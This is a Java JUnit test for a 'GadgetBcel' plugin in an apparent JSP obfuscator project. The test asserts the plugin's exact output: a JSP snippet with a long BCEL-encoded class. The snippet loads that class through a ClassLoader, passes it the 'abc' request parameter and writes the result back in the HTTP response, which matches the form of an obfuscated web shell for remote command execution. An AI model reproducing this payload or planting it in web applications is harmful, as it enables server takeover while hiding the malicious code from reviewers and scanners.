package com.t3stzer0.jspobfuscator.plugins.extensions.Gadget;

import static org.junit.jupiter.api.Assertions.*;

import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContext;
import com.t3stzer0.jspobfuscator.api.plugin.context.ExtensionContextAdapter;
import org.junit.jupiter.api.*;
import java.io.IOException;

public class GadgetBcelTest {

  @Test
  public void testGadgetBcel() {
    GadgetBcel ext = new GadgetBcel();
    ExtensionContextAdapter ctx = new ExtensionContextAdapter();
    ext.initExtension(ctx);
    ctx.setStringInput("cmdParameter", "abc");
    assertFalse(ext.getImports(ctx).isEmpty());
    assertTrue(ext.getDeclaration(ctx).isEmpty());
    assertEquals(1, ext.getCode(ctx).size());
    String expected =
"""
String bcelCode = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$d9R$TA$U$3d$9d$M$e9d$i$I$q$y$89$b8$L$S$c2$S$97$b8$RD$F$J$a2a$R$y$ac$3cN$s$N$O$s$93$d4db$f1G$bej$95$s$96T$f9$e8$83$8f$7e$86$df$60$89$b7$t$c3$S$89$e5$c3$dc$ee$be$f7v$9fsO$df$9e$ef$bf$bf$7c$F$90$c6$86$8a$3eLs$a4T$f8$e4x$9d$e3$86$8a$9b$b8$rMZ$c5m$dcQ$d1$85$bb$w$U$dc$93$e6$beL$9c$J$o$p$c7$d9$Qz$f1$80$e3$n$c7$p$G$bf$zj$M$91$dc$ae$feVO$95tk$t$b5$e9$d8$a6$b5$93a$I$cc$9a$96$e9$cc1$M$qN$87$c7$b7$Y$94$85JQ0$84s$a6$rV$eb$e5$82$b0_$ea$85$92$90$c7U$M$bd$b4$a5$db$a6$5c$7bN$c5ym$S$94$_$97f$d0$96$zK$d8$L$r$bdV$93$f0$a1$5c$c1$Q$a5$91$5c$9aP$fdF$b9$c8$d0$5dsa$e6$ebf$a9$ul$86$f8$v$G$5e$88v$f4$U$ea$db$db$c2$W$c5$N$a1$bb$c9$b1V$b2YI$cd$b7E$uW$v$RW$3a$7e$d3$d1$8d7$xz$d5$e5$e6j$f1$98$f4$q$v$Z$d4$c5$3dCT$j$b3b$d58$e6$Z$82N$a5$85$c8$d0$9f$Y$ef$q$94$baY$a9$db$86$c8$9a$b2$cc$90$yeZfi$e8$c7$C$c3$d0$3f$983$Mv$a6I$d5$k$G$96$adj$dd$a1$5dB$_$b7b$iO4$y$o$aba$JO9$965$3c$c3s$J$94$93fE$c3$w$s4$aca$9d$81$a9$g$92r$VA$94$e3$F$D$f7Df$e8$3d$a6$b4V$d8$V$86$d3$e6$3a$ac6z$c4b$edH$S$ba$9f$84$bc$fa$be$e3$f4$8d$ba$e5$98e$aa$5c$dd$R$ce$d1b$a0M$w$cf$z$_$40$ec$J$83a$acSK$9dp$ad$db$VC$d4j$996$q$cfI7NH$t$a4$n$8d$P$d1$da5$a3$ed$b1D$c7$80$ac$nz$i$f2$faCz$83$U$_$e6$dc$$$J$e8$d5$aa$b0$a8$h$a7$fe$c3$f6$ef$8eT$a4$d2$b8L$ef$ac$8f$k$y$a3$8f$ee$80$ac$8f$e6$fd$Y$a0q$90V$3f$Q$a0W$K$y$r$9b$60$fb$f0$e5$9b$f0$af$ecC$c9$ef$a3$x$ff$Z$81$89$Gx$D$c1$sBM$a8$abS$N$9c$c9$cf$u$df$Q$99$8c$x$Nh$91n2$af$de$j$fcLN6$d0$f3$J$e1$Pt$94$lCd$_$80$93$ed$a6$87$df$D$Na$8c$S$8d$UQ$98$p$f0$y$c1$c7$dc$bf$88$L$8d8$ce$B$ee$ec$3cQ$a4$97$89$M$ed$bfH$UGq$F$97$a8$I$3f$s1L$f3$u$9dw$952$87$e1$3b$a0$a0$c21$c21$caq$8dc$M$f8$85$Y$ad$90$a0$E$85$8e$Z$a7$8f$9a$8f$ac$ac4E$a3T$a1$x$f9$R$e1$f7$ae$Q$92g$c0u$c6$5d$3eZ$x$c1$e3$e3$pLi$a7$I$NP$v$d6K$ec$cf$o$f4$H8hj$S$E$F$A$A";
response.getOutputStream().write(String.valueOf(new ClassLoader().loadClass(bcelCode).getConstructor(String.class).newInstance(request.getParameter("abc")).toString()).getBytes());
""";
    assertEquals(expected, ext.getCode(ctx).get(0));
  }


}
